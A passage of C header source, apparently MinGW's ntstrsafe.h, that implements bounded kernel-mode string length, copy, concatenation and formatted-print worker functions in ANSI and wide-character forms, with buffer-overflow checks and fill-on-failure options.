NTSTRSAFEDDI RtlStringCchLengthA(NTSTRSAFE_PCSTR psz,size_t cchMax,size_t *pcchLength) {
  NTSTATUS hr;
  if(!psz || (cchMax > NTSTRSAFE_MAX_CCH)) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringLengthWorkerA(psz,cchMax,pcchLength);
  if(!NT_SUCCESS(hr) && pcchLength) {
    *pcchLength = 0;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCchLengthW(NTSTRSAFE_PCWSTR psz,size_t cchMax,size_t *pcchLength) {
  NTSTATUS hr;
  if(!psz || (cchMax > NTSTRSAFE_MAX_CCH)) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringLengthWorkerW(psz,cchMax,pcchLength);
  if(!NT_SUCCESS(hr) && pcchLength) {
    *pcchLength = 0;
  }
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbLengthA(NTSTRSAFE_PCSTR psz,size_t cbMax,size_t *pcbLength);
NTSTRSAFEDDI RtlStringCbLengthW(NTSTRSAFE_PCWSTR psz,size_t cbMax,size_t *pcbLength);

#define RtlStringCbLength __MINGW_NAME_AW(RtlStringCbLength)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbLengthA(NTSTRSAFE_PCSTR psz,size_t cbMax,size_t *pcbLength) {
  NTSTATUS hr;
  size_t cchMax;
  size_t cchLength = 0;
  cchMax = cbMax / sizeof(char);
  if(!psz || (cchMax > NTSTRSAFE_MAX_CCH)) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringLengthWorkerA(psz,cchMax,&cchLength);
  if(pcbLength) {
    if(NT_SUCCESS(hr)) {
      *pcbLength = cchLength*sizeof(char);
    } else {
      *pcbLength = 0;
    }
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCbLengthW(NTSTRSAFE_PCWSTR psz,size_t cbMax,size_t *pcbLength) {
  NTSTATUS hr;
  size_t cchMax;
  size_t cchLength = 0;
  cchMax = cbMax / sizeof(wchar_t);
  if(!psz || (cchMax > NTSTRSAFE_MAX_CCH)) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringLengthWorkerW(psz,cchMax,&cchLength);
  if(pcbLength) {
    if(NT_SUCCESS(hr)) {
      *pcbLength = cchLength*sizeof(wchar_t);
    } else {
      *pcbLength = 0;
    }
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc) {
  NTSTATUS hr = STATUS_SUCCESS;
  if(cchDest==0) hr = STATUS_INVALID_PARAMETER;
  else {
    while(cchDest && (*pszSrc!='\0')) {
      *pszDest++ = *pszSrc++;
      cchDest--;
    }
    if(cchDest==0) {
      pszDest--;
      hr = STATUS_BUFFER_OVERFLOW;
    }
    *pszDest= '\0';
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc) {
  NTSTATUS hr = STATUS_SUCCESS;
  if(cchDest==0) hr = STATUS_INVALID_PARAMETER;
  else {
    while(cchDest && (*pszSrc!=L'\0')) {
      *pszDest++ = *pszSrc++;
      cchDest--;
    }
    if(cchDest==0) {
      pszDest--;
      hr = STATUS_BUFFER_OVERFLOW;
    }
    *pszDest= L'\0';
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest!=0) || (cbDest!=0)) hr = STATUS_INVALID_PARAMETER;
      }
      if(!pszSrc) pszSrc = "";
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	pszDestEnd = pszDest;
	cchRemaining = 0;
	if(*pszSrc!='\0') {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else {
	pszDestEnd = pszDest;
	cchRemaining = cchDest;
	while(cchRemaining && (*pszSrc!='\0')) {
	  *pszDestEnd++ = *pszSrc++;
	  cchRemaining--;
	}
	if(cchRemaining > 0) {
	  if(dwFlags & STRSAFE_FILL_BEHIND_NULL) {
	    memset(pszDestEnd + 1,STRSAFE_GET_FILL_PATTERN(dwFlags),((cchRemaining - 1)*sizeof(char)) + (cbDest % sizeof(char)));
	  }
	} else {
	  pszDestEnd--;
	  cchRemaining++;
	  hr = STATUS_BUFFER_OVERFLOW;
	}
	*pszDestEnd = '\0';
      }
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = '\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PWSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest!=0) || (cbDest!=0)) hr = STATUS_INVALID_PARAMETER;
      }
      if(!pszSrc) pszSrc = L"";
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	pszDestEnd = pszDest;
	cchRemaining = 0;
	if(*pszSrc!=L'\0') {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else {
	pszDestEnd = pszDest;
	cchRemaining = cchDest;
	while(cchRemaining && (*pszSrc!=L'\0')) {
	  *pszDestEnd++ = *pszSrc++;
	  cchRemaining--;
	}
	if(cchRemaining > 0) {
	  if(dwFlags & STRSAFE_FILL_BEHIND_NULL) {
	    memset(pszDestEnd + 1,STRSAFE_GET_FILL_PATTERN(dwFlags),((cchRemaining - 1)*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t)));
	  }
	} else {
	  pszDestEnd--;
	  cchRemaining++;
	  hr = STATUS_BUFFER_OVERFLOW;
	}
	*pszDestEnd = L'\0';
      }
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = L'\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyNWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchSrc) {
  NTSTATUS hr = STATUS_SUCCESS;
  if(cchDest==0) hr = STATUS_INVALID_PARAMETER;
  else {
    while(cchDest && cchSrc && (*pszSrc!='\0')) {
      *pszDest++ = *pszSrc++;
      cchDest--;
      cchSrc--;
    }
    if(cchDest==0) {
      pszDest--;
      hr = STATUS_BUFFER_OVERFLOW;
    }
    *pszDest= '\0';
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyNWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy) {
  NTSTATUS hr = STATUS_SUCCESS;
  if(cchDest==0) hr = STATUS_INVALID_PARAMETER;
  else {
    while(cchDest && cchToCopy && (*pszSrc!=L'\0')) {
      *pszDest++ = *pszSrc++;
      cchDest--;
      cchToCopy--;
    }
    if(cchDest==0) {
      pszDest--;
      hr = STATUS_BUFFER_OVERFLOW;
    }
    *pszDest= L'\0';
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyNExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else if(cchToCopy > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest!=0) || (cbDest!=0)) hr = STATUS_INVALID_PARAMETER;
      }
      if(!pszSrc) pszSrc = "";
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	pszDestEnd = pszDest;
	cchRemaining = 0;
	if((cchToCopy!=0) && (*pszSrc!='\0')) {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else {
	pszDestEnd = pszDest;
	cchRemaining = cchDest;
	while(cchRemaining && cchToCopy && (*pszSrc!='\0')) {
	  *pszDestEnd++ = *pszSrc++;
	  cchRemaining--;
	  cchToCopy--;
	}
	if(cchRemaining > 0) {
	  if(dwFlags & STRSAFE_FILL_BEHIND_NULL) {
	    memset(pszDestEnd + 1,STRSAFE_GET_FILL_PATTERN(dwFlags),((cchRemaining - 1)*sizeof(char)) + (cbDest % sizeof(char)));
	  }
	} else {
	  pszDestEnd--;
	  cchRemaining++;
	  hr = STATUS_BUFFER_OVERFLOW;
	}
	*pszDestEnd = '\0';
      }
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = '\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCopyNExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PWSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else if(cchToCopy > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest!=0) || (cbDest!=0)) hr = STATUS_INVALID_PARAMETER;
      }
      if(!pszSrc) pszSrc = L"";
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	pszDestEnd = pszDest;
	cchRemaining = 0;
	if((cchToCopy!=0) && (*pszSrc!=L'\0')) {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else {
	pszDestEnd = pszDest;
	cchRemaining = cchDest;
	while(cchRemaining && cchToCopy && (*pszSrc!=L'\0')) {
	  *pszDestEnd++ = *pszSrc++;
	  cchRemaining--;
	  cchToCopy--;
	}
	if(cchRemaining > 0) {
	  if(dwFlags & STRSAFE_FILL_BEHIND_NULL) {
	    memset(pszDestEnd + 1,STRSAFE_GET_FILL_PATTERN(dwFlags),((cchRemaining - 1)*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t)));
	  }
	} else {
	  pszDestEnd--;
	  cchRemaining++;
	  hr = STATUS_BUFFER_OVERFLOW;
	}
	*pszDestEnd = L'\0';
      }
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = L'\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCatWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc) {
  NTSTATUS hr;
  size_t cchDestLength;
  hr = RtlStringLengthWorkerA(pszDest,cchDest,&cchDestLength);
  if(NT_SUCCESS(hr)) hr = RtlStringCopyWorkerA(pszDest + cchDestLength,cchDest - cchDestLength,pszSrc);
  return hr;
}

NTSTRSAFEDDI RtlStringCatWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc) {
  NTSTATUS hr;
  size_t cchDestLength;
  hr = RtlStringLengthWorkerW(pszDest,cchDest,&cchDestLength);
  if(NT_SUCCESS(hr)) hr = RtlStringCopyWorkerW(pszDest + cchDestLength,cchDest - cchDestLength,pszSrc);
  return hr;
}

NTSTRSAFEDDI RtlStringCatExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else {
    size_t cchDestLength;
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest==0) && (cbDest==0)) cchDestLength = 0;
	else hr = STATUS_INVALID_PARAMETER;
      } else {
	hr = RtlStringLengthWorkerA(pszDest,cchDest,&cchDestLength);
	if(NT_SUCCESS(hr)) {
	  pszDestEnd = pszDest + cchDestLength;
	  cchRemaining = cchDest - cchDestLength;
	}
      }
      if(!pszSrc) pszSrc = "";
    } else {
      hr = RtlStringLengthWorkerA(pszDest,cchDest,&cchDestLength);
      if(NT_SUCCESS(hr)) {
	pszDestEnd = pszDest + cchDestLength;
	cchRemaining = cchDest - cchDestLength;
      }
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	if(*pszSrc!='\0') {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else hr = RtlStringCopyExWorkerA(pszDestEnd,cchRemaining,(cchRemaining*sizeof(char)) + (cbDest % sizeof(char)),pszSrc,&pszDestEnd,&cchRemaining,dwFlags & (~(STRSAFE_FILL_ON_FAILURE | STRSAFE_NULL_ON_FAILURE)));
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	}
      }
      if(dwFlags & STRSAFE_NULL_ON_FAILURE) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = '\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCatExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PWSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else {
    size_t cchDestLength;
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest==0) && (cbDest==0)) cchDestLength = 0;
	else hr = STATUS_INVALID_PARAMETER;
      } else {
	hr = RtlStringLengthWorkerW(pszDest,cchDest,&cchDestLength);
	if(NT_SUCCESS(hr)) {
	  pszDestEnd = pszDest + cchDestLength;
	  cchRemaining = cchDest - cchDestLength;
	}
      }
      if(!pszSrc) pszSrc = L"";
    } else {
      hr = RtlStringLengthWorkerW(pszDest,cchDest,&cchDestLength);
      if(NT_SUCCESS(hr)) {
	pszDestEnd = pszDest + cchDestLength;
	cchRemaining = cchDest - cchDestLength;
      }
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	if(*pszSrc!=L'\0') {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else hr = RtlStringCopyExWorkerW(pszDestEnd,cchRemaining,(cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t)),pszSrc,&pszDestEnd,&cchRemaining,dwFlags & (~(STRSAFE_FILL_ON_FAILURE | STRSAFE_NULL_ON_FAILURE)));
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	}
      }
      if(dwFlags & STRSAFE_NULL_ON_FAILURE) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = L'\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCatNWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend) {
  NTSTATUS hr;
  size_t cchDestLength;
  hr = RtlStringLengthWorkerA(pszDest,cchDest,&cchDestLength);
  if(NT_SUCCESS(hr)) hr = RtlStringCopyNWorkerA(pszDest + cchDestLength,cchDest - cchDestLength,pszSrc,cchToAppend);
  return hr;
}

NTSTRSAFEDDI RtlStringCatNWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend) {
  NTSTATUS hr;
  size_t cchDestLength;
  hr = RtlStringLengthWorkerW(pszDest,cchDest,&cchDestLength);
  if(NT_SUCCESS(hr)) hr = RtlStringCopyNWorkerW(pszDest + cchDestLength,cchDest - cchDestLength,pszSrc,cchToAppend);
  return hr;
}

NTSTRSAFEDDI RtlStringCatNExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  size_t cchDestLength = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else if(cchToAppend > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest==0) && (cbDest==0)) cchDestLength = 0;
	else hr = STATUS_INVALID_PARAMETER;
      } else {
	hr = RtlStringLengthWorkerA(pszDest,cchDest,&cchDestLength);
	if(NT_SUCCESS(hr)) {
	  pszDestEnd = pszDest + cchDestLength;
	  cchRemaining = cchDest - cchDestLength;
	}
      }
      if(!pszSrc) pszSrc = "";
    } else {
      hr = RtlStringLengthWorkerA(pszDest,cchDest,&cchDestLength);
      if(NT_SUCCESS(hr)) {
	pszDestEnd = pszDest + cchDestLength;
	cchRemaining = cchDest - cchDestLength;
      }
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	if((cchToAppend!=0) && (*pszSrc!='\0')) {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else hr = RtlStringCopyNExWorkerA(pszDestEnd,cchRemaining,(cchRemaining*sizeof(char)) + (cbDest % sizeof(char)),pszSrc,cchToAppend,&pszDestEnd,&cchRemaining,dwFlags & (~(STRSAFE_FILL_ON_FAILURE | STRSAFE_NULL_ON_FAILURE)));
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = '\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = '\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCatNExWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PWSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  size_t cchDestLength = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else if(cchToAppend > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
      if(!pszDest) {
	if((cchDest==0) && (cbDest==0)) cchDestLength = 0;
	else hr = STATUS_INVALID_PARAMETER;
      } else {
	hr = RtlStringLengthWorkerW(pszDest,cchDest,&cchDestLength);
	if(NT_SUCCESS(hr)) {
	  pszDestEnd = pszDest + cchDestLength;
	  cchRemaining = cchDest - cchDestLength;
	}
      }
      if(!pszSrc) pszSrc = L"";
    } else {
      hr = RtlStringLengthWorkerW(pszDest,cchDest,&cchDestLength);
      if(NT_SUCCESS(hr)) {
	pszDestEnd = pszDest + cchDestLength;
	cchRemaining = cchDest - cchDestLength;
      }
    }
    if(NT_SUCCESS(hr)) {
      if(cchDest==0) {
	if((cchToAppend!=0) && (*pszSrc!=L'\0')) {
	  if(!pszDest) hr = STATUS_INVALID_PARAMETER;
	  else hr = STATUS_BUFFER_OVERFLOW;
	}
      } else hr = RtlStringCopyNExWorkerW(pszDestEnd,cchRemaining,(cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t)),pszSrc,cchToAppend,&pszDestEnd,&cchRemaining,dwFlags & (~(STRSAFE_FILL_ON_FAILURE | STRSAFE_NULL_ON_FAILURE)));
    }
  }
  if(!NT_SUCCESS(hr)) {
    if(pszDest) {
      if(dwFlags & STRSAFE_FILL_ON_FAILURE) {
	memset(pszDest,STRSAFE_GET_FILL_PATTERN(dwFlags),cbDest);
	if(STRSAFE_GET_FILL_PATTERN(dwFlags)==0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	} else if(cchDest > 0) {
	  pszDestEnd = pszDest + cchDest - 1;
	  cchRemaining = 1;
	  *pszDestEnd = L'\0';
	}
      }
      if(dwFlags & (STRSAFE_NULL_ON_FAILURE)) {
	if(cchDest > 0) {
	  pszDestEnd = pszDest;
	  cchRemaining = cchDest;
	  *pszDestEnd = L'\0';
	}
      }
    }
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(ppszDestEnd) *ppszDestEnd = pszDestEnd;
    if(pcchRemaining) *pcchRemaining = cchRemaining;
  }
  return hr;
}

NTSTRSAFEDDI RtlStringVPrintfWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszFormat,va_list argList) {
  NTSTATUS hr = STATUS_SUCCESS;
  if(cchDest==0) hr = STATUS_INVALID_PARAMETER;
  else {
    int iRet;
    size_t cchMax;
    cchMax = cchDest - 1;
    iRet = _vsnprintf(pszDest,cchMax,pszFormat,argList);
    if((iRet < 0) || (((size_t)iRet) > cchMax)) {
      pszDest += cchMax;
      *pszDest = '\0';
      hr = STATUS_BUFFER_OVERFLOW;
    } else if(((size_t)iRet)==cchMax) {
      pszDest += cchMax;
      *pszDest = '\0';
    }
  }
  return hr;
}

NTSTRSAFEDDI RtlStringVPrintfWorkerW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszFormat,va_list argList) {
  NTSTATUS hr = STATUS_SUCCESS;
  if(cchDest==0) hr = STATUS_INVALID_PARAMETER;
  else {
    int iRet;
    size_t cchMax;
    cchMax = cchDest - 1;
    iRet = _vsnwprintf(pszDest,cchMax,pszFormat,argList);
    if((iRet < 0) || (((size_t)iRet) > cchMax)) {
      pszDest += cchMax;
      *pszDest = L'\0';
      hr = STATUS_BUFFER_OVERFLOW;
    } else if(((size_t)iRet)==cchMax) {
      pszDest += cchMax;
      *pszDest = L'\0';
    }
  }
  return hr;
}

NTSTRSAFEDDI RtlStringVPrintfExWorkerA(NTSTRSAFE_PSTR pszDest,size_t cchDest,size_t cbDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,va_list argList) {
  NTSTATUS hr = STATUS_SUCCESS;
  NTSTRSAFE_PSTR pszDestEnd = pszDest;
  size_t cchRemaining = 0;
  if(dwFlags & (~STRSAFE_VALID_FLAGS)) hr = STATUS_INVALID_PARAMETER;
  else {
    if(dwFlags & STRSAFE_IGNORE_NULLS) {
